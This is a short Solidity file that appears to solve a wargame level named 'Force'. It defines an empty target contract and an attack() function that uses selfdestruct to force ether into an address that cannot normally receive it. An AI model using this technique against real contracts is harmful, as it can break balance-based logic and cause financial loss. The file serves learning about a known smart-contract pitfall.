// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Force {}

contract ForceDestruct {
    function attack(address payable _contract) public payable {
        selfdestruct(_contract);
    }
}
